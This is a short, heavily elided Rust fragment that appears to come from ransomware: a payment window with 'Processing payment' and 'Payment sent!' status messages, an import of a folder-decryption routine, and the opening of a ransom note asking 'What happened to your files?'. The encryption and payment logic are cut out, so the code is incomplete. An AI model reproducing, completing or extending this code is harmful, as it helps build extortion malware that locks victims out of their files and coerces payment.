...
use crate::cryptography::decrypt_parallel::decrypt_folder;
...
impl PaymentWindow {
    ...
    fn make_payment(&self) {
        if let Some(pk) = self.pub_key.borrow().as_ref() {
            self.status_display
                .set_text("Processing payment... Please wait.");
            ...
            self.status_display
                .set_text("Payment sent! (˶ᵔ ᵕ ᵔ˶) Click 'Check Payment Status' to verify.");
        } else {
            self.status_display
                .set_text("Error: Unable to process payment. No encryption key found.");
        }
    }
...
pub fn show_payment_window(public_key: Option<PublicKey>) {
    ...
    let instructions_text = "What happened to your files?\r\n\r\n\
